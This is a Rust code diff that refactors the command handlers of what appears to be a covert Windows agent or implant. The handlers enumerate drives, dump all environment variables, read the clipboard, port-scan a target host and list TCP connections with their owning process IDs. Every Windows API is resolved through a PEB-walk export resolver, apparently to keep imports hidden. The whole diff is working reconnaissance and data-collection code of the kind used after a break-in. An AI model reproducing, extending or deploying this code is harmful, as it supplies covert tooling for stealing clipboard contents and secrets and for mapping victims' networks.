@@ -166,22 +166,48 @@ fn read_u32_le(buf: &[u8], off: usize) -> Option<u32> {
 /// Disk usage per drive. Mirrors agent-dev `do_driveinfo` semantics but via
 /// Win32: enumerate roots with `GetLogicalDriveStringsW`, then query each with
 /// `GetDiskFreeSpaceExW`. Line format: `C:\ total=X free=Y avail=Z`.
+type GetLogicalDriveStringsW = unsafe extern "system" fn(u32, *mut u16) -> u32;
+type GetDiskFreeSpaceExW =
+    unsafe extern "system" fn(*const u16, *mut u64, *mut u64, *mut u64) -> i32;
+
+/// Disk usage per drive. Mirrors agent-dev `do_driveinfo` semantics but via
+/// Win32: enumerate roots with `GetLogicalDriveStringsW`, then query each with
+/// `GetDiskFreeSpaceExW`. Line format: `C:\ total=X free=Y avail=Z`.
 pub fn do_driveinfo() -> Response {
-    type GetLogicalDriveStringsW = unsafe extern "system" fn(u32, *mut u16) -> u32;
-    type GetDiskFreeSpaceExW =
-        unsafe extern "system" fn(*const u16, *mut u64, *mut u64, *mut u64) -> i32;
+    let glds = match do_driveinfo_resolve_glds() {
+        Some(f) => f,
+        None => return Response::Err("driveinfo: GetLogicalDriveStringsW unresolved".into()),
+    };
+    let gdfs = match do_driveinfo_resolve_gdfs() {
+        Some(f) => f,
+        None => return Response::Err("driveinfo: GetDiskFreeSpaceExW unresolved".into()),
+    };
+    do_driveinfo_collect(glds, gdfs)
+}
 
-    let glds: GetLogicalDriveStringsW =
-        match unsafe { export_addr(b"kernel32.dll", b"GetLogicalDriveStringsW") } {
-            Some(a) => unsafe { core::mem::transmute(a) },
-            None => return Response::Err("driveinfo: GetLogicalDriveStringsW unresolved".into()),
-        };
-    let gdfs: GetDiskFreeSpaceExW =
-        match unsafe { export_addr(b"kernel32.dll", b"GetDiskFreeSpaceExW") } {
-            Some(a) => unsafe { core::mem::transmute(a) },
-            None => return Response::Err("driveinfo: GetDiskFreeSpaceExW unresolved".into()),
-        };
+/// Resolve `GetLogicalDriveStringsW` via the PEB-walk export resolver.
+fn do_driveinfo_resolve_glds() -> Option<GetLogicalDriveStringsW> {
+    match unsafe { export_addr(b"kernel32.dll", b"GetLogicalDriveStringsW") } {
+        Some(a) => Some(unsafe { core::mem::transmute(a) }),
+        None => None,
+    }
+}
 
+/// Resolve `GetDiskFreeSpaceExW` via the PEB-walk export resolver.
+fn do_driveinfo_resolve_gdfs() -> Option<GetDiskFreeSpaceExW> {
+    match unsafe { export_addr(b"kernel32.dll", b"GetDiskFreeSpaceExW") } {
+        Some(a) => Some(unsafe { core::mem::transmute(a) }),
+        None => None,
+    }
+}
+
+/// Enumerate drive roots with `GetLogicalDriveStringsW` and query each via
+/// `GetDiskFreeSpaceExW`, appending one `C:\ total=X free=Y avail=Z` line per
+/// reachable drive.
+fn do_driveinfo_collect(
+    glds: GetLogicalDriveStringsW,
+    gdfs: GetDiskFreeSpaceExW,
+) -> Response {
     const BUFW: usize = 260;
     let mut buf = vec![0u16; BUFW];
     // Fills buf with "C:\\\0D:\\\0...\0\0" (UTF-16). Returns chars copied,
@@ -204,32 +230,37 @@ pub fn do_driveinfo() -> Response {
             break; // empty entry == end-of-list marker
         }
         let root = &buf[start..i];
-        // GetDiskFreeSpaceExW needs a NUL-terminated root; rebuild a tiny buf.
-        let mut root16 = Vec::with_capacity(root.len() + 1);
-        root16.extend_from_slice(root);
-        root16.push(0);
-
-        let mut avail: u64 = 0;
-        let mut total: u64 = 0;
-        let mut free: u64 = 0;
-        let ok = unsafe { gdfs(root16.as_ptr(), &mut avail, &mut total, &mut free) };
-
-        push_str(&mut out, &utf16_to_utf8_lossy(root));
-        if ok != 0 {
-            push_str(&mut out, b" total=");
-            push_u64(&mut out, total);
-            push_str(&mut out, b" free=");
-            push_u64(&mut out, free);
-            push_str(&mut out, b" avail=");
-            push_u64(&mut out, avail);
-            push_str(&mut out, b"\n");
-        } else {
-            // e.g. empty CD-ROM tray; report it instead of silently skipping.
-            push_str(&mut out, b" <unavailable>\n");
-        }
+        do_driveinfo_query_root(gdfs, root, &mut out);
         i += 1; // skip the separating NUL
     }
     Response::Output(out)
+}
+
+/// Query one drive root and append its `C:\ total=X free=Y avail=Z` line.
+fn do_driveinfo_query_root(gdfs: GetDiskFreeSpaceExW, root: &[u16], out: &mut Vec<u8>) {
+    // GetDiskFreeSpaceExW needs a NUL-terminated root; rebuild a tiny buf.
+    let mut root16 = Vec::with_capacity(root.len() + 1);
+    root16.extend_from_slice(root);
+    root16.push(0);
+
+    let mut avail: u64 = 0;
+    let mut total: u64 = 0;
+    let mut free: u64 = 0;
+    let ok = unsafe { gdfs(root16.as_ptr(), &mut avail, &mut total, &mut free) };
+
+    push_str(out, &utf16_to_utf8_lossy(root));
+    if ok != 0 {
+        push_str(out, b" total=");
+        push_u64(out, total);
+        push_str(out, b" free=");
+        push_u64(out, free);
+        push_str(out, b" avail=");
+        push_u64(out, avail);
+        push_str(out, b"\n");
+    } else {
+        // e.g. empty CD-ROM tray; report it instead of silently skipping.
+        push_str(out, b" <unavailable>\n");
+    }
 }
 
 // ---- do_env ----------------------------------------------------------------
@@ -239,83 +270,94 @@ pub fn do_driveinfo() -> Response {
 /// `GetEnvironmentVariableW`). Matches agent-dev `do_env` semantics.
 pub fn do_env(name: &str) -> Response {
     if name.is_empty() {
-        type GetEnvStringsW = unsafe extern "system" fn() -> *mut u16;
-        type FreeEnvStringsW = unsafe extern "system" fn(*mut u16) -> i32;
-
-        let ges: GetEnvStringsW =
-            match unsafe { export_addr(b"kernel32.dll", b"GetEnvironmentStringsW") } {
-                Some(a) => unsafe { core::mem::transmute(a) },
-                None => return Response::Err("env: GetEnvironmentStringsW unresolved".into()),
-            };
-        let fes: FreeEnvStringsW =
-            match unsafe { export_addr(b"kernel32.dll", b"FreeEnvironmentStringsW") } {
-                Some(a) => unsafe { core::mem::transmute(a) },
-                None => return Response::Err("env: FreeEnvironmentStringsW unresolved".into()),
-            };
-
-        let block = unsafe { ges() };
-        if block.is_null() {
-            return Response::Output(Vec::new());
-        }
-        let mut out: Vec<u8> = Vec::new();
-        unsafe {
-            let mut p = block;
-            loop {
-                // Measure this entry up to its NUL.
-                let mut len = 0usize;
-                while *p.add(len) != 0 {
-                    len += 1;
-                }
-                if len == 0 {
-                    break; // terminating empty entry ends the block
-                }
-                let entry = core::slice::from_raw_parts(p, len);
-                let bytes = utf16_to_utf8_lossy(entry);
-                // Win32 prefixes undocumented vars with '=' (e.g. "=ExitCode");
-                // skip those — they aren't real environment variables.
-                if !bytes.starts_with(b"=") {
-                    out.extend_from_slice(&bytes);
-                    out.push(b'\n');
-                }
-                p = p.add(len + 1); // advance past this entry + its NUL
-            }
-            let _ = fes(block); // always free, even on early break
-        }
-        Response::Output(out)
+        do_env_dump_all()
     } else {
-        type GetEnvVarW = unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;
-        let gev: GetEnvVarW =
-            match unsafe { export_addr(b"kernel32.dll", b"GetEnvironmentVariableW") } {
-                Some(a) => unsafe { core::mem::transmute(a) },
-                None => return Response::Err("env: GetEnvironmentVariableW unresolved".into()),
-            };
-
-        let name16 = to_utf16(name.as_bytes());
-        // 32767 is the documented max env-var length in chars; avoids the
-        // truncation that a 260-wide buffer would cause on long PATH values.
-        const BUFW: usize = 32767;
-        let mut buf = vec![0u16; BUFW];
-        // Returns chars copied (excl. NUL). 0 ⇒ not found (or empty value).
-        let n = unsafe { gev(name16.as_ptr(), buf.as_mut_ptr(), BUFW as u32) };
-        if n == 0 {
-            // Note: a genuinely empty-valued var also yields 0 here; we treat
-            // both as "not set" for simplicity (matching the dev agent).
-            return Response::Err({
-                let mut e = String::new();
-                e.push_str("env: ");
-                e.push_str(name);
-                e.push_str(" not set");
-                e
-            });
-        }
-        let n = (n as usize).min(BUFW);
-        let mut out: Vec<u8> = Vec::new();
-        out.extend_from_slice(name.as_bytes());
-        out.push(b'=');
-        out.extend_from_slice(&utf16_to_utf8_lossy(&buf[..n]));
-        out.push(b'\n');
-        Response::Output(out)
+        do_env_single(name)
     }
+}
+
+/// Dump the full environment block via `GetEnvironmentStringsW` (the `name`
+/// empty case), skipping Win32's undocumented `=`-prefixed pseudo-vars.
+fn do_env_dump_all() -> Response {
+    type GetEnvStringsW = unsafe extern "system" fn() -> *mut u16;
+    type FreeEnvStringsW = unsafe extern "system" fn(*mut u16) -> i32;
+
+    let ges: GetEnvStringsW =
+        match unsafe { export_addr(b"kernel32.dll", b"GetEnvironmentStringsW") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return Response::Err("env: GetEnvironmentStringsW unresolved".into()),
+        };
+    let fes: FreeEnvStringsW =
+        match unsafe { export_addr(b"kernel32.dll", b"FreeEnvironmentStringsW") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return Response::Err("env: FreeEnvironmentStringsW unresolved".into()),
+        };
+
+    let block = unsafe { ges() };
+    if block.is_null() {
+        return Response::Output(Vec::new());
+    }
+    let mut out: Vec<u8> = Vec::new();
+    unsafe {
+        let mut p = block;
+        loop {
+            // Measure this entry up to its NUL.
+            let mut len = 0usize;
+            while *p.add(len) != 0 {
+                len += 1;
+            }
+            if len == 0 {
+                break; // terminating empty entry ends the block
+            }
+            let entry = core::slice::from_raw_parts(p, len);
+            let bytes = utf16_to_utf8_lossy(entry);
+            // Win32 prefixes undocumented vars with '=' (e.g. "=ExitCode");
+            // skip those — they aren't real environment variables.
+            if !bytes.starts_with(b"=") {
+                out.extend_from_slice(&bytes);
+                out.push(b'\n');
+            }
+            p = p.add(len + 1); // advance past this entry + its NUL
+        }
+        let _ = fes(block); // always free, even on early break
+    }
+    Response::Output(out)
+}
+
+/// Fetch a single environment variable via `GetEnvironmentVariableW`.
+fn do_env_single(name: &str) -> Response {
+    type GetEnvVarW = unsafe extern "system" fn(*const u16, *mut u16, u32) -> u32;
+    let gev: GetEnvVarW =
+        match unsafe { export_addr(b"kernel32.dll", b"GetEnvironmentVariableW") } {
+            Some(a) => unsafe { core::mem::transmute(a) },
+            None => return Response::Err("env: GetEnvironmentVariableW unresolved".into()),
+        };
+
+    let name16 = to_utf16(name.as_bytes());
+    // 32767 is the documented max env-var length in chars; avoids the
+    // truncation that a 260-wide buffer would cause on long PATH values.
+    const BUFW: usize = 32767;
+    let mut buf = vec![0u16; BUFW];
+    // Returns chars copied (excl. NUL). 0 ⇒ not found (or empty value).
+    let n = unsafe { gev(name16.as_ptr(), buf.as_mut_ptr(), BUFW as u32) };
+    if n == 0 {
+        // Note: a genuinely empty-valued var also yields 0 here; we treat
+        // both as "not set" for simplicity (matching the dev agent).
+        return Response::Err({
+            let mut e = String::new();
+            e.push_str("env: ");
+            e.push_str(name);
+            e.push_str(" not set");
+            e
+        });
+    }
+    let n = (n as usize).min(BUFW);
+    let mut out: Vec<u8> = Vec::new();
+    out.extend_from_slice(name.as_bytes());
+    out.push(b'=');
+    out.extend_from_slice(&utf16_to_utf8_lossy(&buf[..n]));
+    out.push(b'\n');
+    Response::Output(out)
 }
 
 // ---- do_clipboard ----------------------------------------------------------
@@ -339,107 +381,160 @@ fn bounded_nul_len<T: Copy + PartialEq>(p: *const T, max_units: usize) -> usize 
     len
 }
 
+type OpenClipboard = unsafe extern "system" fn(*mut c_void) -> i32;
+type CloseClipboard = unsafe extern "system" fn() -> i32;
+type GetClipboardData = unsafe extern "system" fn(u32) -> *mut c_void;
+type IsClipboardFormatAvailable = unsafe extern "system" fn(u32) -> i32;
+type GlobalLock = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
+type GlobalUnlock = unsafe extern "system" fn(*mut c_void) -> i32;
+// `SIZE_T` (usize). Returns the allocation size in bytes of the HGLOBAL,
+// or 0 on failure — the bound for every NUL scan below.
+type GlobalSize = unsafe extern "system" fn(*mut c_void) -> usize;
+
+/// Resolved clipboard entry points used by [`do_clipboard`].
+struct ClipboardFns {
+    open: OpenClipboard,
+    close: CloseClipboard,
+    getdata: GetClipboardData,
+    isavail: IsClipboardFormatAvailable,
+    glock: GlobalLock,
+    gunlock: GlobalUnlock,
+    gsize: GlobalSize,
+}
+
 /// Clipboard text. Force-loads user32, opens the clipboard and returns text as
 /// UTF-8 bytes. Prefers `CF_UNICODETEXT`; falls back to `CF_TEXT` (ANSI).
 pub fn do_clipboard() -> Response {
     if !force_load(b"user32.dll") {
         return Response::Err("clipboard: user32.dll load failed".into());
     }
-    type OpenClipboard = unsafe extern "system" fn(*mut c_void) -> i32;
-    type CloseClipboard = unsafe extern "system" fn() -> i32;
-    type GetClipboardData = unsafe extern "system" fn(u32) -> *mut c_void;
-    type IsClipboardFormatAvailable = unsafe extern "system" fn(u32) -> i32;
-    type GlobalLock = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
-    type GlobalUnlock = unsafe extern "system" fn(*mut c_void) -> i32;
-    // `SIZE_T` (usize). Returns the allocation size in bytes of the HGLOBAL,
-    // or 0 on failure — the bound for every NUL scan below.
-    type GlobalSize = unsafe extern "system" fn(*mut c_void) -> usize;
+    let fns = match do_clipboard_resolve() {
+        Ok(f) => f,
+        Err(e) => return Response::Err(e.into()),
+    };
+    do_clipboard_read(fns)
+}
 
+/// Resolve all user32/kernel32 clipboard entry points via the PEB-walk export
+/// resolver.
+fn do_clipboard_resolve() -> Result<ClipboardFns, &'static str> {
     let open: OpenClipboard = match unsafe { export_addr(b"user32.dll", b"OpenClipboard") } {
         Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err("clipboard: OpenClipboard unresolved".into()),
+        None => return Err("clipboard: OpenClipboard unresolved"),
     };
     let close: CloseClipboard = match unsafe { export_addr(b"user32.dll", b"CloseClipboard") } {
         Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err("clipboard: CloseClipboard unresolved".into()),
+        None => return Err("clipboard: CloseClipboard unresolved"),
     };
     let getdata: GetClipboardData = match unsafe { export_addr(b"user32.dll", b"GetClipboardData") }
     {
         Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err("clipboard: GetClipboardData unresolved".into()),
+        None => return Err("clipboard: GetClipboardData unresolved"),
     };
     let isavail: IsClipboardFormatAvailable = match unsafe {
         export_addr(b"user32.dll", b"IsClipboardFormatAvailable")
     } {
         Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err("clipboard: IsClipboardFormatAvailable unresolved".into()),
+        None => return Err("clipboard: IsClipboardFormatAvailable unresolved"),
     };
     let glock: GlobalLock = match unsafe { export_addr(b"kernel32.dll", b"GlobalLock") } {
         Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err("clipboard: GlobalLock unresolved".into()),
+        None => return Err("clipboard: GlobalLock unresolved"),
     };
     let gunlock: GlobalUnlock = match unsafe { export_addr(b"kernel32.dll", b"GlobalUnlock") } {
         Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err("clipboard: GlobalUnlock unresolved".into()),
+        None => return Err("clipboard: GlobalUnlock unresolved"),
     };
     let gsize: GlobalSize = match unsafe { export_addr(b"kernel32.dll", b"GlobalSize") } {
         Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err("clipboard: GlobalSize unresolved".into()),
+        None => return Err("clipboard: GlobalSize unresolved"),
     };
+    Ok(ClipboardFns {
+        open,
+        close,
+        getdata,
+        isavail,
+        glock,
+        gunlock,
+        gsize,
+    })
+}
 
-    if unsafe { open(core::ptr::null_mut()) } == 0 {
+/// Open the clipboard, pick the richest available text format, and convert
+/// its payload to UTF-8.
+fn do_clipboard_read(fns: ClipboardFns) -> Response {
+    if unsafe { (fns.open)(core::ptr::null_mut()) } == 0 {
         return Response::Err("clipboard: OpenClipboard failed".into());
     }
 
     // Pick the richest available text format.
-    let (fmt, unicode) = if unsafe { isavail(CF_UNICODETEXT) } != 0 {
+    let (fmt, unicode) = if unsafe { (fns.isavail)(CF_UNICODETEXT) } != 0 {
         (CF_UNICODETEXT, true)
-    } else if unsafe { isavail(CF_TEXT) } != 0 {
+    } else if unsafe { (fns.isavail)(CF_TEXT) } != 0 {
         (CF_TEXT, false)
     } else {
         // No text on the clipboard — empty output, not an error.
-        unsafe { close() };
+        unsafe { (fns.close)() };
         return Response::Output(Vec::new());
     };
 
     let mut out: Vec<u8> = Vec::new();
-    let h = unsafe { getdata(fmt) };
+    let h = unsafe { (fns.getdata)(fmt) };
     if !h.is_null() {
-        let p = unsafe { glock(h) };
-        if !p.is_null() {
-            // Bound every scan by the locked allocation's size so a malformed
-            // clipboard payload without a NUL terminator can never read past
-            // the HGLOBAL. GlobalSize returns 0 on failure (bad handle) —
-            // bail out with an error rather than guessing a size.
-            let size_bytes = unsafe { gsize(h) };
-            if size_bytes == 0 {
-                unsafe { gunlock(h) };
-                unsafe { close() };
-                return Response::Err("clipboard: GlobalSize failed".into());
+        match do_clipboard_read_locked(&fns, h, unicode) {
+            Ok(bytes) => out = bytes,
+            Err(e) => {
+                unsafe { (fns.close)() };
+                return Response::Err(e.into());
             }
-            if unicode {
-                // Count UTF-16 units up to the NUL terminator (bounded by the
-                // allocation size in bytes / 2), then convert.
-                let len = bounded_nul_len(p as *const u16, size_bytes / 2);
-                // SAFETY: `len <= size_bytes / 2`, so the slice covers at most
-                // `size_bytes` bytes at `p`, which GlobalSize(h) guarantees
-                // readable for the lifetime of the lock.
-                let wide = unsafe { core::slice::from_raw_parts(p as *const u16, len) };
-                out = utf16_to_utf8_lossy(wide);
-            } else {
-                // CF_TEXT is ANSI bytes; pass through verbatim (ASCII fast
-                // path), bounded by the allocation size.
-                let len = bounded_nul_len(p as *const u8, size_bytes);
-                // SAFETY: `len <= size_bytes`; see above.
-                out.extend_from_slice(unsafe {
-                    core::slice::from_raw_parts(p as *const u8, len)
-                });
-            }
-            unsafe { gunlock(h) };
         }
     }
-    unsafe { close() };
+    unsafe { (fns.close)() };
     Response::Output(out)
+}
+
+/// Lock the HGLOBAL and convert its payload to UTF-8, bounding every NUL scan
+/// by the allocation's size. `Err` is a `GlobalSize` failure (bad handle).
+fn do_clipboard_read_locked(
+    fns: &ClipboardFns,
+    h: *mut c_void,
+    unicode: bool,
+) -> Result<Vec<u8>, &'static str> {
+    let p = unsafe { (fns.glock)(h) };
+    if p.is_null() {
+        return Ok(Vec::new());
+    }
+    // Bound every scan by the locked allocation's size so a malformed
+    // clipboard payload without a NUL terminator can never read past
+    // the HGLOBAL. GlobalSize returns 0 on failure (bad handle) —
+    // bail out with an error rather than guessing a size.
+    let size_bytes = unsafe { (fns.gsize)(h) };
+    if size_bytes == 0 {
+        unsafe { (fns.gunlock)(h) };
+        return Err("clipboard: GlobalSize failed");
+    }
+    let out = if unicode {
+        // Count UTF-16 units up to the NUL terminator (bounded by the
+        // allocation size in bytes / 2), then convert.
+        let len = bounded_nul_len(p as *const u16, size_bytes / 2);
+        // SAFETY: `len <= size_bytes / 2`, so the slice covers at most
+        // `size_bytes` bytes at `p`, which GlobalSize(h) guarantees
+        // readable for the lifetime of the lock.
+        let wide = unsafe { core::slice::from_raw_parts(p as *const u16, len) };
+        utf16_to_utf8_lossy(wide)
+    } else {
+        // CF_TEXT is ANSI bytes; pass through verbatim (ASCII fast
+        // path), bounded by the allocation size.
+        let len = bounded_nul_len(p as *const u8, size_bytes);
+        // SAFETY: `len <= size_bytes`; see above.
+        let mut out = Vec::new();
+        out.extend_from_slice(unsafe {
+            core::slice::from_raw_parts(p as *const u8, len)
+        });
+        out
+    };
+    unsafe { (fns.gunlock)(h) };
+    Ok(out)
 }
 
 #[cfg(test)]
@@ -548,6 +643,15 @@ struct WsaFns {
     getsockopt: unsafe extern "system" fn(usize, i32, i32, *mut u8, *mut i32) -> i32,
 }
 
+/// Resolved winsock entry points used by [`do_portscan`] (startup/cleanup/
+/// address resolution plus the [`WsaFns`] probe set).
+struct PortscanFns {
+    startup: unsafe extern "system" fn(u16, *mut u8) -> i32,
+    cleanup: unsafe extern "system" fn() -> i32,
+    inet_addr: unsafe extern "system" fn(*const u8) -> u32,
+    probe: WsaFns,
+}
+
 /// Probe one TCP port with a 2-second deadline. Sets the socket non-blocking,
 /// issues a connect (returns WSAEWOULDBLOCK immediately), then polls `select`
 /// on the write set and confirms success via `SO_ERROR`.
@@ -584,6 +688,14 @@ fn probe_one(f: &WsaFns, addr: u32, port: u16) -> bool {
     };
     let n = unsafe { (f.select)(0, core::ptr::null(), &wfds, core::ptr::null(), &tv) };
 
+    let open = probe_one_check(f, s, n);
+    unsafe { (f.close)(s) };
+    open
+}
+
+/// `select` result: writable ⇒ either connected or errored; `SO_ERROR`
+/// disambiguates.
+fn probe_one_check(f: &WsaFns, s: usize, n: i32) -> bool {
     let mut open = false;
     if n > 0 {
         // Writable ⇒ either connected or errored; SO_ERROR disambiguates.
@@ -602,7 +714,6 @@ fn probe_one(f: &WsaFns, addr: u32, port: u16) -> bool {
             open = true;
         }
     }
-    unsafe { (f.close)(s) };
     open
 }
 
@@ -626,7 +737,62 @@ pub fn do_portscan(host: &str, ports: &str) -> Response {
         return Response::Err("portscan: ws2_32.dll load failed".into());
     }
 
+    let fns = match do_portscan_resolve() {
+        Ok(f) => f,
+        Err(e) => return Response::Err(e.into()),
+    };
+
+    // Resolve the target IPv4 (NUL-terminated for inet_addr).
+    let mut hostz = [0u8; 256];
+    let hn = host.as_bytes().len().min(hostz.len() - 1);
+    hostz[..hn].copy_from_slice(&host.as_bytes()[..hn]);
+    let addr = unsafe { (fns.inet_addr)(hostz.as_ptr()) };
+    if addr == INADDR_NONE {
+        return Response::Err("portscan: invalid IPv4 address".into());
+    }
+
+    // WSAData is 404 bytes on x64; a zeroed byte buffer is simpler & safe for
+    // STARTUP-only use (we never read fields back out of it).
+    let mut wsadata = [0u8; 404];
+    if unsafe { (fns.startup)(0x0202, wsadata.as_mut_ptr()) } != 0 {
+        // 0x0202 == request winsock 2.2.
+        return Response::Err("portscan: WSAStartup failed".into());
+    }
+
+    let out = do_portscan_scan(&fns.probe, &targets, addr);
+    unsafe { (fns.cleanup)() };
+    Response::Output(out)
+}
+
+/// Resolve the startup/cleanup/address winsock entry points via the PEB-walk
+/// export resolver.
+fn do_portscan_resolve() -> Result<PortscanFns, &'static str> {
     type WSAStartup = unsafe extern "system" fn(u16, *mut u8) -> i32;
+    type InetAddr = unsafe extern "system" fn(*const u8) -> u32;
+    type WSACleanup = unsafe extern "system" fn() -> i32;
+
+    let startup: WSAStartup = match unsafe { export_addr(b"ws2_32.dll", b"WSAStartup") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return Err("portscan: WSAStartup unresolved"),
+    };
+    let cleanup: WSACleanup = match unsafe { export_addr(b"ws2_32.dll", b"WSACleanup") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return Err("portscan: WSACleanup unresolved"),
+    };
+    let inet_addr: InetAddr = match unsafe { export_addr(b"ws2_32.dll", b"inet_addr") } {
+        Some(a) => unsafe { core::mem::transmute(a) },
+        None => return Err("portscan: inet_addr unresolved"),
+    };
+    Ok(PortscanFns {
+        startup,
+        cleanup,
+        inet_addr,
+        probe: do_portscan_resolve_probe()?,
+    })
+}
+
+/// Resolve the per-port probe winsock entry points into a [`WsaFns`].
+fn do_portscan_resolve_probe() -> Result<WsaFns, &'static str> {
     type ConnectFn = unsafe extern "system" fn(usize, *const SockAddrIn, i32) -> i32;
     type CloseSocket = unsafe extern "system" fn(usize) -> i32;
     type IoctlSocket = unsafe extern "system" fn(usize, i32, *mut u32) -> i32;
@@ -637,74 +803,46 @@ pub fn do_portscan(host: &str, ports: &str) -> Response {
         *const FdSet,
         *const Timeval,
     ) -> i32;
-    type InetAddr = unsafe extern "system" fn(*const u8) -> u32;
-    type WSACleanup = unsafe extern "system" fn() -> i32;
     type GetSockOpt = unsafe extern "system" fn(usize, i32, i32, *mut u8, *mut i32) -> i32;
 
-    let startup: WSAStartup = match unsafe { export_addr(b"ws2_32.dll", b"WSAStartup") } {
-        Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err("portscan: WSAStartup unresolved".into()),
-    };
-    let cleanup: WSACleanup = match unsafe { export_addr(b"ws2_32.dll", b"WSACleanup") } {
-        Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err("portscan: WSACleanup unresolved".into()),
-    };
-    let inet_addr: InetAddr = match unsafe { export_addr(b"ws2_32.dll", b"inet_addr") } {
-        Some(a) => unsafe { core::mem::transmute(a) },
-        None => return Response::Err("portscan: inet_addr unresolved".into()),
-    };
-    let fns = WsaFns {
+    let probe = WsaFns {
         socket: match unsafe { export_addr(b"ws2_32.dll", b"socket") } {
             Some(a) => unsafe { core::mem::transmute(a) },
-            None => return Response::Err("portscan: socket unresolved".into()),
+            None => return Err("portscan: socket unresolved"),
         },
         connect: match unsafe { export_addr(b"ws2_32.dll", b"connect") } {
             Some(a) => unsafe { core::mem::transmute::<_, ConnectFn>(a) },
-            None => return Response::Err("portscan: connect unresolved".into()),
+            None => return Err("portscan: connect unresolved"),
         },
         close: match unsafe { export_addr(b"ws2_32.dll", b"closesocket") } {
             Some(a) => unsafe { core::mem::transmute::<_, CloseSocket>(a) },
-            None => return Response::Err("portscan: closesocket unresolved".into()),
+            None => return Err("portscan: closesocket unresolved"),
         },
         ioctl: match unsafe { export_addr(b"ws2_32.dll", b"ioctlsocket") } {
             Some(a) => unsafe { core::mem::transmute::<_, IoctlSocket>(a) },
-            None => return Response::Err("portscan: ioctlsocket unresolved".into()),
+            None => return Err("portscan: ioctlsocket unresolved"),
         },
         select: match unsafe { export_addr(b"ws2_32.dll", b"select") } {
             Some(a) => unsafe { core::mem::transmute::<_, SelectFn>(a) },
-            None => return Response::Err("portscan: select unresolved".into()),
+            None => return Err("portscan: select unresolved"),
         },
         getsockopt: match unsafe { export_addr(b"ws2_32.dll", b"getsockopt") } {
             Some(a) => unsafe { core::mem::transmute::<_, GetSockOpt>(a) },
-            None => return Response::Err("portscan: getsockopt unresolved".into()),
+            None => return Err("portscan: getsockopt unresolved"),
         },
     };
+    Ok(probe)
+}
 
-    // Resolve the target IPv4 (NUL-terminated for inet_addr).
-    let mut hostz = [0u8; 256];
-    let hn = host.as_bytes().len().min(hostz.len() - 1);
-    hostz[..hn].copy_from_slice(&host.as_bytes()[..hn]);
-    let addr = unsafe { inet_addr(hostz.as_ptr()) };
-    if addr == INADDR_NONE {
-        return Response::Err("portscan: invalid IPv4 address".into());
-    }
-
-    // WSAData is 404 bytes on x64; a zeroed byte buffer is simpler & safe for
-    // STARTUP-only use (we never read fields back out of it).
-    let mut wsadata = [0u8; 404];
-    if unsafe { startup(0x0202, wsadata.as_mut_ptr()) } != 0 {
-        // 0x0202 == request winsock 2.2.
-        return Response::Err("portscan: WSAStartup failed".into());
-    }
-
+/// Probe each target port, appending one `PORT open/closed` line per port.
+fn do_portscan_scan(f: &WsaFns, targets: &[u16], addr: u32) -> Vec<u8> {
     let mut out: Vec<u8> = Vec::new();
-    for &port in &targets {
-        let open = probe_one(&fns, addr, port);
+    for &port in targets {
+        let open = probe_one(f, addr, port);
         push_u64(&mut out, port as u64);
         push_str(&mut out, if open { b" open\n" } else { b" closed\n" });
     }
-    unsafe { cleanup() };
-    Response::Output(out)
+    out
 }
 
 // ---- do_net ----------------------------------------------------------------
@@ -868,13 +1006,25 @@ fn push_tcp_state(out: &mut Vec<u8>, s: u32) {
 
 /// `MIB_TCPROW_OWNER_PID`-style connection table query via
 /// `GetExtendedTcpTable` (IPv4 owner-PID variant).
+/// `GetExtendedTcpTable` signature (IPv4 owner-PID variant).
+type GetExtTcp = unsafe extern "system" fn(*mut u8, *mut u32, i32, u32, u32, u32) -> u32;
+
 fn net_connections() -> Response {
-    type GetExtTcp = unsafe extern "system" fn(*mut u8, *mut u32, i32, u32, u32, u32) -> u32;
     let f: GetExtTcp = match unsafe { export_addr(b"iphlpapi.dll", b"GetExtendedTcpTable") } {
         Some(a) => unsafe { core::mem::transmute(a) },
         None => return Response::Err("net connections: GetExtendedTcpTable unresolved".into()),
     };
+    let buf = match net_connections_fill(f) {
+        Ok(Some(b)) => b,
+        Ok(None) => return Response::Output(Vec::new()),
+        Err(()) => return Response::Err("net connections: GetExtendedTcpTable failed".into()),
+    };
+    Response::Output(net_connections_rows(&buf))
+}
 
+/// Size-query, allocate and fill the `GetExtendedTcpTable` buffer. Returns
+/// `Ok(None)` when the table is empty, `Err(())` when the query failed.
+fn net_connections_fill(f: GetExtTcp) -> Result<Option<Vec<u8>>, ()> {
     // Size query: AF_INET=2, TCP_TABLE_OWNER_PID_ALL=5, Reserved=0.
     let mut size: u32 = 0;
     let _ = unsafe {
@@ -888,7 +1038,7 @@ fn net_connections() -> Response {
         )
     };
     if size == 0 || (size as usize) > (1 << 20) {
-        return Response::Output(Vec::new());
+        return Ok(None);
     }
     let mut buf = vec![0u8; size as usize];
     let rc = unsafe {
@@ -902,12 +1052,17 @@ fn net_connections() -> Response {
         )
     };
     if rc != 0 {
-        return Response::Err("net connections: GetExtendedTcpTable failed".into());
+        return Err(());
     }
+    Ok(Some(buf))
+}
 
+/// Render `MIB_TCPROW_OWNER_PID` rows as
+/// `STATE laddr:lport -> raddr:rport pid=N` lines.
+fn net_connections_rows(buf: &[u8]) -> Vec<u8> {
     // MIB_TCPROW_OWNER_PID: 24 bytes (state, laddr, lport, raddr, rport, pid).
     const ROW: usize = 24;
-    let n = read_u32_le(&buf, 0).unwrap_or(0) as usize;
+    let n = read_u32_le(buf, 0).unwrap_or(0) as usize;
     let mut out: Vec<u8> = Vec::new();
     let mut i = 0;
     while i < n {
@@ -915,12 +1070,12 @@ fn net_connections() -> Response {
         if off + ROW > buf.len() {
             break;
         }
-        let state = read_u32_le(&buf, off).unwrap_or(0);
-        let laddr = read_u32_le(&buf, off + 4).unwrap_or(0);
